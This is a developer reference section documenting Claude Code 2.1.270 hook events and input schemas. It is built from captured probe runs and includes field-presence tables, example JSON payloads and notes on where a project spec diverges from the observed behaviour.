<!-- Rendered by build_section.py from SECTION.tmpl.md. Every fenced example below is pulled
     byte-for-byte from a capture file under docs/probes/2026-09-14-schemas/hooks/; the only edit
     is trimming of long JSON strings, marked with "...". Do not hand-edit SECTION.md. -->
<!-- AUDIT 2026-09-14 (auditor pass): every fenced example (93 non-empty lines) was re-traced to its
     capture file: each line is a byte-for-byte substring of one capture line (with "..." trims), and
     the multi-line blocks are contiguous in their source files. No example or value comes from a real
     user session (every transcript_path is under -tmp-shp-*; the only API key is the mock's fake
     key). The auditor then hand-edited prose only: some Status lines were downgraded and some
     Spec-alignment bullets were corrected (each is marked "Audit:"). SECTION.tmpl.md was NOT updated,
     so re-running build_section.py drops these edits. -->

# Claude Code hooks (headless `-p`, plus one TUI run) — schemas observed 2026-09-14

**Scope of this section.** Claude Code 2.1.270 on Linux 6.8 (binary
`/root/.local/share/claude/versions/2.1.270`, sha256 `3a624a5a…3ef0`, recorded in
`docs/probes/2026-09-14-schemas/hooks/binary/version.txt`). Every live run records
`claude --version` in its `meta.json` and in every capture line (`_claude_version`).

**How the evidence was made.**

| Probe | What it is | Re-run |
|---|---|---|
| `extract_binary.py` | byte-search of the CLI binary for the event enum, the zod input/output schemas, the settings hooks schema, enums and runtime snippets → `binary/` | `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py` |
| `run_probes.py` | 50+ headless runs, each in a fresh `mktemp`-style dir under `/tmp`, hooks for all 33 events in `<tmpdir>/.claude/settings.json` (or `--settings`), `claude-haiku-4-5-20251001` unless noted → `live/<scenario>/` | `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py list` then `… run_probes.py S01 S02 …` (S02–S06, S14 reuse S01's session) |
| `interactive_probe.py` | one TUI session driven through a private `pty.fork()` (no tmux) for the events `-p` cannot reach → `live/I01_interactive/` | `python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py` |
| `mock_api.py` | 127.0.0.1 stand-in for the Messages API (fake key, isolated `CLAUDE_CONFIG_DIR`) used only to provoke API-error classes → `live/S08_*`, `live/S22_*` | started by `run_probes.py S08` / `S22` |
| `capture_hook.sh` | the hook command: appends raw stdin + event name + UTC timestamp + `/proc` parent chain + claude pid, fork-free bash | — |
| `capture_env.py` | second hook on some events: env var names (values only for an allowlist, secrets `<redacted>`), stdin/tty facts, ancestry with cmdlines | — |
| `summarize.py` / `build_section.py` | field matrix (`live/_field-matrix.txt`, `live/_sequences.txt`) and this file | `python3 …/summarize.py && python3 …/build_section.py` |

**Safety record.** `~/.claude/settings.json` sha256 was identical before and after every run
(`meta.json` → `user_settings_sha256_*`). The cc10x user plugin was disabled in every throwaway
settings file and **did not register or fire** (debug: `Read hooks.json for plugin cc10x (enabled=false; will NOT register, plugin is disabled)`,
`live/*/debug-cc10x-lines.txt`; the only hook commands in any debug log are `capture_hook.sh`/`capture_env.py`).
`CLAUDE*`/`CLAUDECODE` vars inherited from the calling session were scrubbed before each launch;
`PATH`, `TERM`, `TMUX` were still inherited from it. Claude Code itself wrote trust/bookkeeping
entries to `~/.claude.json` and transcripts under `~/.claude/projects/-tmp-shp-hooks-*`.
No real user transcript was read for this section.

---

## Hook event names (the enum)

- **Produced by:** Claude Code 2.1.270 (settings validator `Im` and SDK schema `Sle`, identical lists)
- **Consumed by:** §6 `EngineAdapter.hook_events()` / capability matrix (spec line 550), §8 "Events subscribed" (lines 912–923); D9, D24; M1
- **Probe:** `docs/probes/2026-09-14-schemas/hooks/extract_binary.py` → `binary/hook-events.json`, `binary/sdk-hook-events.json`; live cross-check `run_probes.py all` + `interactive_probe.py` → `live/_field-matrix.txt`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py && python3 docs/probes/2026-09-14-schemas/hooks/summarize.py`
- **Status:** partially verified — 31 of 33 names fired live 2026-09-14; TeammateIdle and WorktreeRemove from the binary only

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/R03_config_unknown_event_name/doctor.txt` — the list as printed by `claude doctor`; same list extracted from the binary in `binary/hook-events.json`)

```text
Valid events: PreToolUse, PostToolUse, PostToolUseFailure, PostToolBatch, Notification, UserPromptSubmit, UserPromptExpansion, SessionStart, SessionEnd, Stop, StopFailure, SubagentStart, SubagentStop, PreCompact, PostCompact, PreModelSwitch, PostModelSwitch, PermissionRequest, PermissionDenied, Setup, TeammateIdle, TaskCreated, TaskCompleted, Elicitation, ElicitationResult, ConfigChange, WorktreeCreate, WorktreeRemove, InstructionsLoaded, CwdChanged, FileChanged, DirectoryAdded, MessageDisplay
```

| # | Event | Fired live? | Where |
|---|---|---|---|
| 1 | PreToolUse | yes (42) | S01, S09, S10, … |
| 2 | PostToolUse | yes (30) | S01, S17 (MCP tool), … |
| 3 | PostToolUseFailure | yes (2) | S01 (`false`, Read of missing file) |
| 4 | PostToolBatch | yes (40) | S01, S09, R01 |
| 5 | Notification | yes (3) | I01 (TUI) ×2, S17 (`-p`, MCP elicitation) |
| 6 | UserPromptSubmit | yes (57) | all runs with a prompt |
| 7 | UserPromptExpansion | yes (1) | S12 (custom slash command) |
| 8 | SessionStart | yes (55) | all runs |
| 9 | SessionEnd | yes (50) | most runs (see SessionEnd for the gaps) |
| 10 | Stop | yes (26) | S01, S10, S11, … |
| 11 | StopFailure | yes (23) | S07 (real API), S08 (mock API), R03, R04, S16 |
| 12 | SubagentStart | yes (2) | S01, S18 |
| 13 | SubagentStop | yes (4) | S01, S18, S05 (compaction), I01 |
| 14 | PreCompact | yes (1, `manual`) | S05 |
| 15 | PostCompact | yes (1, `manual`) | S05 |
| 16 | PreModelSwitch | yes (1) | S14 (`/model sonnet` in `-p`) |
| 17 | PostModelSwitch | yes (1) | S14 |
| 18 | PermissionRequest | yes (6) | S01, S09, S13, I01 |
| 19 | PermissionDenied | yes (1) | S20 (auto mode, classifier deny, sonnet) |
| 20 | Setup | yes (3) | S16 (`--init`, `--init-only`, `--maintenance`) |
| 21 | TeammateIdle | **no** | not attempted (agent teams) |
| 22 | TaskCreated | yes (3) | S01, S18 |
| 23 | TaskCompleted | yes (2) | S01, S18 |
| 24 | Elicitation | yes (1) | S17 |
| 25 | ElicitationResult | yes (1) | S17 |
| 26 | ConfigChange | yes (1) | S21 |
| 27 | WorktreeCreate | yes (1) | S15 (`--worktree`) |
| 28 | WorktreeRemove | **no** | not provoked (S15's create hook returned no path, so no worktree existed to remove) |
| 29 | InstructionsLoaded | yes (16) | every run with a `CLAUDE.md` |
| 30 | CwdChanged | yes (1) | S13 (`cd sub && pwd`) |
| 31 | FileChanged | yes (2) | S13, S21 (only for hook-declared `watchPaths`) |
| 32 | DirectoryAdded | yes (1) | I01 (`/add-dir`) |
| 33 | MessageDisplay | yes (51) | most runs |

**Variants and edge cases:**
- The settings validator and the SDK type list are the same 33 names in the same order (`binary/hook-events.json` vs `binary/sdk-hook-events.json`).
- An unknown event key in settings is ignored with a warning, not an error (see Hooks config schema).

**Spec alignment:**
- spec line 550 says `hooks | **rich** (32 events)`; reality is 33 event names in 2.1.270 (`binary/hook-events.json` `"count": 33`).
- spec lines 912–923 (events subscribed): every name exists. Not subscribed but relevant to Shepherd's columns: `PostToolBatch` (the only event emitted for a denied/hook-blocked tool call, see PostToolBatch), `InstructionsLoaded`, `ConfigChange`, `DirectoryAdded`, `Setup`, `UserPromptExpansion`, `WorktreeCreate/Remove`, `TeammateIdle`.

---

## Common input fields (every hook's stdin JSON)

- **Produced by:** Claude Code 2.1.270, builder `La()` (`binary/runtime-source-snippets.txt` line 3) and zod base schema `we` (`binary/hook-input-schemas.txt` line 2)
- **Consumed by:** §8 "Common fields on every hook event" (lines 929–931), §8 event→column table (lines 878–887), §7 `session.engine_session_id`/`cwd`/`last_event_at` (lines 652, 676); D22, D24, D37; M1
- **Probe:** `run_probes.py all` + `interactive_probe.py`, matrix by `build_section.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S10 && python3 docs/probes/2026-09-14-schemas/hooks/build_section.py`
- **Status:** verified live 2026-09-14 (429 captures, 53 runs)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl` — a main-thread and a subagent PreToolUse; `live/S10_effort_sonnet/events.jsonl` for `effort`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo hello","description":"Echo hello"},"tool_use_id":"toolu_015R8tPjv7FUHuW6MDJj8HpT"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","agent_id":"a7154de3fc719065c","agent_type":"general-purpose","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo sub","description":"Echo the word \"sub\""},"tool_use_id":"toolu_01J7Hz4JQN7aKxM639k1RP4M"}
{"session_id":"5c59934b-3bd1-43ab-9506-a6a16f581034","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-effort-7yb7myuc/5c59934b-3bd1-43ab-9506-a6a16f581034.jsonl","cwd":"/tmp/shp-hooks-effort-7yb7myuc","prompt_id":"a95c9922-3b49-44f2-8906-ef313239b6c1","permission_mode":"default","effort":{"level":"low"},"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo effort"},"tool_use_id":"toolu_01GMFr9hqoiRLwgVGjRNm3LY"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id` | string (UUID) | always | e.g. `8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6` | Changes on `/clear` (new id on `SessionStart{source:clear}`) and on `--fork-session`; kept by `--resume`. With `--continue`, the first `InstructionsLoaded` carried a provisional id (`437540c8…`) different from the resumed id on `SessionStart` (`8bbcceab…`) (`live/S03_continue/events.jsonl`) |
| `transcript_path` | string | always | `/root/.claude/projects/<cwd with every non-alphanumeric char → "-">/<session_id>.jsonl`; under `$CLAUDE_CONFIG_DIR/projects/…` when that is set | Use verbatim; `_` in cwd becomes `-` (`-tmp-shp-hooks-slash--ul-amd7` for `/tmp/shp-hooks-slash-_ul_amd7`) |
| `cwd` | string | always | session cwd; after a Bash `cd` the value follows the new dir (`CwdChanged` example) | |
| `hook_event_name` | string | always | the 33 names | |
| `prompt_id` | string (UUID) | sometimes | see matrix | Absent before the first prompt of the process (all `SessionStart{startup/resume/fork/clear}`, `InstructionsLoaded`, `Setup`, `WorktreeCreate`); present on `SessionStart{compact}` |
| `permission_mode` | string | sometimes | `default`, `acceptEdits`, `dontAsk`, `plan`, `auto` | Only on tool/turn events (see matrix). `bypassPermissions` not observable here: refused as root (`live/S09_perm_bypass_echo/stderr.txt`). `--permission-mode auto` on haiku silently ran as `default` (`live/S09_perm_auto_mode_delete_outside`) |
| `effort` | object `{level}` | sometimes | `{"level":"low"}` (sonnet `--effort low`), `{"level":"high"}` (sonnet default; also nonexistent model) | Absent on every haiku event; never on SessionStart/SessionEnd/UserPromptSubmit/MessageDisplay/Notification/Task*/Subagent*; present on tool events, Stop, PermissionDenied and StopFailure when the model supports effort |
| `agent_id` | string | sometimes | `a7154de3fc719065c` | Only on events fired inside a subagent (and on Subagent* events) |
| `agent_type` | string | sometimes | `general-purpose`, `shpprobe` (custom `--agents`), `""` | `""` on SubagentStop of internal subagents (compaction, post-turn) |
| `scratchpad_dir` | string | sometimes | `/tmp/claude-0/<project>/<session_id>/scratchpad` | **Not in the zod schema** but emitted by `La()`; seen only in the TUI run (I01) |
| any timestamp | — | **never** | — | No payload key is a time; `seconds_since_last_response` (SessionStart resume/fork) is the only time-like field. Receipt time must be stamped by the receiver |

Common-field presence per event, over all retained captures (`live/*/events.jsonl`):

| Event (n captures) | `session_id` | `transcript_path` | `cwd` | `hook_event_name` | `prompt_id` | `permission_mode` | `effort` | `agent_id` | `agent_type` | `scratchpad_dir` |
|---|---|---|---|---|---|---|---|---|---|---|
| ConfigChange (1) | always | always | always | always | always | never | never | never | never | never |
| CwdChanged (1) | always | always | always | always | always | never | never | never | never | never |
| DirectoryAdded (1) | always | always | always | always | always | never | never | never | never | always |
| Elicitation (1) | always | always | always | always | always | never | never | never | never | never |
| ElicitationResult (1) | always | always | always | always | always | never | never | never | never | never |
| FileChanged (2) | always | always | always | always | always | never | never | never | never | never |
| InstructionsLoaded (16) | always | always | always | always | never | never | never | never | never | never |
| MessageDisplay (51) | always | always | always | always | always | never | never | never | never | 1/51 |
| Notification (3) | always | always | always | always | always | never | never | never | never | 2/3 |
| PermissionDenied (1) | always | always | always | always | always | always | always | never | never | never |
| PermissionRequest (6) | always | always | always | always | always | always | never | never | never | 1/6 |
| PostCompact (1) | always | always | always | always | always | never | never | never | never | never |
| PostModelSwitch (1) | always | always | always | always | always | never | never | never | never | never |
| PostToolBatch (40) | always | always | always | always | always | always | 3/40 | 1/40 | 1/40 | never |
| PostToolUse (30) | always | always | always | always | always | always | 3/30 | 1/30 | 1/30 | never |
| PostToolUseFailure (2) | always | always | always | always | always | always | never | never | never | never |
| PreCompact (1) | always | always | always | always | always | never | never | never | never | never |
| PreModelSwitch (1) | always | always | always | always | always | never | never | never | never | never |
| PreToolUse (42) | always | always | always | always | always | always | 4/42 | 1/42 | 1/42 | 1/42 |
| SessionEnd (50) | always | always | always | always | 48/50 | never | never | never | never | 2/50 |
| SessionStart (55) | always | always | always | always | 1/55 | never | never | never | never | 2/55 |
| Setup (3) | always | always | always | always | never | never | never | never | never | never |
| Stop (26) | always | always | always | always | always | always | 4/26 | never | never | 1/26 |
| StopFailure (23) | always | always | always | always | always | never | 13/23 | never | never | never |
| SubagentStart (2) | always | always | always | always | always | never | never | always | always | never |
| SubagentStop (4) | always | always | always | always | always | always | never | always | always | 1/4 |
| TaskCompleted (2) | always | always | always | always | always | never | never | never | never | never |
| TaskCreated (3) | always | always | always | always | always | never | never | never | never | never |
| UserPromptExpansion (1) | always | always | always | always | always | always | never | never | never | never |
| UserPromptSubmit (57) | always | always | always | always | always | always | never | never | never | 2/57 |
| WorktreeCreate (1) | always | always | always | always | never | never | never | never | never | never |

**Variants and edge cases:**
- Claude Code writes the JSON followed by one `\n` and then closes stdin (429/429 captures have `_raw_trailing_newline: true`).
- Field order is stable: common fields first (`session_id, transcript_path, cwd, [scratchpad_dir], [prompt_id], [permission_mode], [agent_id, agent_type], [effort]`), then `hook_event_name`, then event fields.
- `effort` sits **before** `hook_event_name` in the byte stream; do not parse positionally.

**Spec alignment:**
- spec lines 929–931 say "Common fields on every hook event: `session_id`, `prompt_id`, `transcript_path`, `cwd`, `permission_mode`, `effort.level`, `hook_event_name`"; reality is only `session_id`, `transcript_path`, `cwd`, `hook_event_name` are on every event. `prompt_id` is missing on 54/55 SessionStart, all InstructionsLoaded/Setup/WorktreeCreate; `permission_mode` is missing on SessionStart, SessionEnd, StopFailure, MessageDisplay, Notification, TaskCreated/TaskCompleted, SubagentStart, Pre/PostCompact, Pre/PostModelSwitch, InstructionsLoaded, ConfigChange, CwdChanged, FileChanged, DirectoryAdded, Elicitation*; `effort` is absent for haiku and on lifecycle events (matrix above; `live/_field-matrix.txt`).
- spec line 881 (`SessionStart` registers `engine_session_id`) is aligned, but the id is not stable for the life of a terminal: `/clear` ends it (`SessionEnd{reason:clear}`) and starts a new id (`live/S06_clear/events.jsonl`, `live/I01_interactive/events.jsonl`). spec line 652 ("nothing may key off it") is consistent with this.
- spec line 880 (`last_event_at` from any event) is aligned only if stamped on receipt: no event carries a timestamp.

---

## SessionStart

- **Produced by:** Claude Code 2.1.270 (zod `Ple`, `binary/hook-input-schemas.txt` line 24)
- **Consumed by:** §8 line 881 (register attached session, `cwd`→repo), line 922; §9 `ask()` fork (line 1205); D1, D13, D22; M1, M3
- **Probe:** `run_probes.py S01 S02 S03 S04 S05 S06` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S02 S03 S04 S05 S06`
- **Status:** partially verified — all 5 `source` values and the resume/fork/compact extras live 2026-09-14; optional `agent_type` and `session_title` never observed (schema only). Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S02_resume/events.jsonl`, `live/S04_fork/events.jsonl`, `live/S05_compact/events.jsonl`, `live/S06_clear/events.jsonl`, `live/I01_interactive/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"startup"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"resume","seconds_since_last_response":10,"context_tokens":25613,"prompt_cache_likely_expired":false,"estimated_cache_write_usd":0.0512}
{"session_id":"e4fa0c49-4643-43e0-b4db-9718159c2925","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/e4fa0c49-4643-43e0-b4db-9718159c2925.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"fork","seconds_since_last_response":3,"context_tokens":25768,"prompt_cache_likely_expired":false,"estimated_cache_write_usd":0.0515}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","hook_event_name":"SessionStart","source":"compact","model":"claude-haiku-4-5-20251001"}
{"session_id":"95945ad4-d3ab-4ad9-9ee2-28981ab616e2","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/95945ad4-d3ab-4ad9-9ee2-28981ab616e2.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"clear"}
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","hook_event_name":"SessionStart","source":"startup","model":"claude-haiku-4-5-20251001"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `source` | enum | always | `startup` (45), `resume` (6), `clear` (2), `fork` (1), `compact` (1) | binary enum `["startup","resume","clear","compact","fork"]`; `--continue` reports `resume` |
| `model` | string | sometimes (2/55) | `claude-haiku-4-5-20251001` | seen on TUI startup and on `compact` |
| `seconds_since_last_response` | int | sometimes (7/55) | `10`, `3` | only `resume`/`fork` |
| `context_tokens` | int | sometimes (7/55) | `25613` | only `resume`/`fork` |
| `prompt_cache_likely_expired` | bool | sometimes (7/55) | `false`, `true` | only `resume`/`fork` |
| `estimated_cache_write_usd` | number | sometimes (7/55) | `0.0512` | only `resume`/`fork` |
| `agent_type` | string | never observed | — | schema: present with `--agent` |
| `session_title` | string | never observed | — | schema only |

**Variants and edge cases:**
- Order on resume: `InstructionsLoaded` fires **before** `SessionStart` (S02–S06).
- `/compact`: `PreCompact` → internal `SubagentStop{agent_type:""}` → `SessionStart{source:compact}` (same session id, carries `prompt_id`) → `PostCompact` (`live/S05_compact/events.jsonl`).
- `/clear` in `-p` and TUI: `SessionEnd{reason:clear}` (old id) → `SessionStart{source:clear}` (new id, no `prompt_id`).
- `-p` in a never-trusted dir still runs hooks (trust dialog skipped in `-p`); in the TUI, `SessionStart` fired only after the trust dialog was accepted (`live/I01_interactive/steps.txt`).
- The matcher value is `source` (`hook_name` `SessionStart:startup` in `live/S07_bad_model/stdout.jsonl`).

**Spec alignment:**
- spec line 1205 says "`SessionStart` hook's `start_reason` enum includes `fork`"; reality: the field is `source`; `fork` verified live with `--resume <id> --fork-session` (`live/S04_fork/events.jsonl`).
- spec line 881: aligned (`session_id`, `cwd` always present).

---

## SessionEnd

- **Produced by:** Claude Code 2.1.270 (zod `ice`, reason enum `rce`, `binary/hook-input-schemas.txt`)
- **Consumed by:** §8 lines 887, 918 (stop trigger), lines 967–970 (`user_exited`, `cleared`, `logged_out`, `resumed_elsewhere`); D24; M1, M2
- **Probe:** `run_probes.py S01 S06 S07 S08 S11 R04` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S06 S07 S11 && python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** partially verified — `other`, `clear`, `prompt_input_exit` live; `logout`, `resume` binary only

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S06_clear/events.jsonl`, `live/I01_interactive/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"SessionEnd","reason":"other"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"195cafac-c608-402b-9e39-1fde2bdb8c08","hook_event_name":"SessionEnd","reason":"clear"}
{"session_id":"a51d4a06-747f-4aaa-856e-3d451e9c9841","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/a51d4a06-747f-4aaa-856e-3d451e9c9841.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/a51d4a06-747f-4aaa-856e-3d451e9c9841/scratchpad","prompt_id":"79e10e3a-d6a6-4942-8902-88f9ca2bac9c","hook_event_name":"SessionEnd","reason":"prompt_input_exit"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `reason` | enum | always | `other` (47), `clear` (2), `prompt_input_exit` (1) | binary enum `["clear","resume","logout","prompt_input_exit","other"]`. Every `-p` exit, success or error, is `other` |

**Variants and edge cases:**
- **`SessionEnd` is not guaranteed in `-p`.** It was never dispatched (no SessionEnd line in the debug log) in `S07_bad_model`, `S08_mock_http429`, `R04_settings_flag` (StopFailure exits) and `S11_background_task` (`live/S11_background_task/debug-extras.txt`: `print wind-down: killing background shell bx4s43qvk ("Background sleep and echo command") after 5000ms grace`, then exit). It did arrive in the other 20 StopFailure runs. `S15_worktree` failed before any session existed. Treat process exit as the stop signal of record.
- `logout` not attempted: `/logout` would sign the user out of the real account on this machine. `resume` (switching sessions via `/resume` inside a TUI) not attempted.
- `prompt_id` present 48/50 (absent when no prompt was ever submitted in that session id, e.g. the post-`/clear` id in `-p`).

**Spec alignment:**
- spec lines 967–970 say `SessionEnd.end_reason = …`; reality: the field is `reason` (`live/S06_clear/events.jsonl`). Values `prompt_input_exit`, `clear` verified; `logout`, `resume` exist in the binary enum.
- spec line 887 (`Stop` / `StopFailure` / `SessionEnd` triggers classification): aligned. SessionEnd was missing in 4 `-p` runs that had a session (above), but in each of those runs a `Stop` or `StopFailure` reached the bash capture hook. The spec already treats "observed process exit" as a stop signal (line 938) and has a `crashed` rule (line 964). Audit: this was a claimed misalignment and is refuted. The real risk is a slow hook losing StopFailure at `-p` shutdown (see StopFailure and the Hook runtime contract).

---

## UserPromptSubmit

- **Produced by:** Claude Code 2.1.270 (zod `kle`)
- **Consumed by:** §8 line 882 (`brief`), line 922; §7 `brief` (line 664); M1
- **Probe:** `run_probes.py S01 S18 R01`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S18`
- **Status:** partially verified — payload verified live 2026-09-14; optional `source` and `session_title` never observed

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S18_agents_tasks/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"This is a hook test. Do these steps in order, exactly one tool call per step, do not skip any step even if one fails, an..."}
{"session_id":"0ef819b5-ed3a-47e0-a967-651766f112f6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-agents--y7kt13l/0ef819b5-ed3a-47e0-a967-651766f112f6.jsonl","cwd":"/tmp/shp-hooks-agents-_y7kt13l","prompt_id":"aee11f7f-c04f-40c4-a6d5-bc46d1170e1b","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"<task-notification>\n<task-id>af9f464d837cbc5c2</task-id>\n<tool-use-id>toolu_013K9z1stFBsEG5B5RySxQ9H</tool-use-id>\n<o..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `prompt` | string | always | user text; `/compact` etc. do not fire it; system-injected `<task-notification>…` | |
| `source` | enum | never observed | — | binary: `["user","sdk","system","loop_wakeup","schedule_wakeup","poll_event"]`, optional; absent even on the injected `<task-notification>` prompt |
| `session_title` | string | never observed | — | schema only |

**Variants and edge cases:**
- After a background subagent finishes, Claude Code injects a `<task-notification>` prompt that fires `UserPromptSubmit` with a new `prompt_id` and a second `Stop` (`live/S18_agents_tasks/events.jsonl`).
- Exit-0 stdout of a UserPromptSubmit hook is added to the model context (R01: model quoted `PAPAYA` "from the `UserPromptSubmit hook success` message", `live/R01_exit_codes/stdout.jsonl`).

**Spec alignment:**
- spec line 882 (`brief` from `UserPromptSubmit`): partially aligned — the latest `prompt` can be a system `<task-notification>` block with no `source` to tell it apart (`live/S18_agents_tasks/events.jsonl`); only the first prompt per session is a safe `brief`.

---

## UserPromptExpansion

- **Produced by:** Claude Code 2.1.270 (zod `Ole`)
- **Consumed by:** not consumed by the spec today; relevant to §8 line 882 (`brief` for slash-command sessions)
- **Probe:** `run_probes.py S12`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S12`
- **Status:** partially verified — `expansion_type:"slash_command"` live; `mcp_prompt` binary only

**Real example** (trimmed; full capture: `live/S12_slash_command/events.jsonl`)

```json
{"session_id":"6c85dece-8494-4493-9bc0-7d75a093d5d9","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-slash--ul-amd7/6c85dece-8494-4493-9bc0-7d75a093d5d9.jsonl","cwd":"/tmp/shp-hooks-slash-_ul_amd7","prompt_id":"7b3886f4-517f-45fd-bfdd-268a25f946b7","permission_mode":"default","hook_event_name":"UserPromptExpansion","expansion_type":"slash_command","command_name":"shpecho","command_args":"EXPANDED","command_source":"projectSettings","prompt":"/shpecho EXPANDED"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `expansion_type` | enum | always | `slash_command` | binary: `slash_command`, `mcp_prompt` |
| `command_name` | string | always | `shpecho` | |
| `command_args` | string | always | `EXPANDED` | |
| `command_source` | string | always | `projectSettings` | optional in schema |
| `prompt` | string | always | `/shpecho EXPANDED` | the unexpanded input |

**Variants and edge cases:** fires before `UserPromptSubmit` for the same `prompt_id`.

**Spec alignment:** aligned (not referenced).

---

## PreToolUse

- **Produced by:** Claude Code 2.1.270 (zod `ble`)
- **Consumed by:** §8 line 916 (liveness); §8 heuristics 2 and 4 (tool ledger); M1, M2
- **Probe:** `run_probes.py S01 S09 S17 R01 R02`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S09_perm_deny_rule_bash_rm/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Agent","tool_input":{"description":"Run bash echo sub command","prompt":"Run the Bash command: echo sub. Then reply done.","subagent_type":"general-purpose","run_in_background":false},"tool_use_id":"toolu_01UyNmiq2fWehP4Jooar3YS7"}
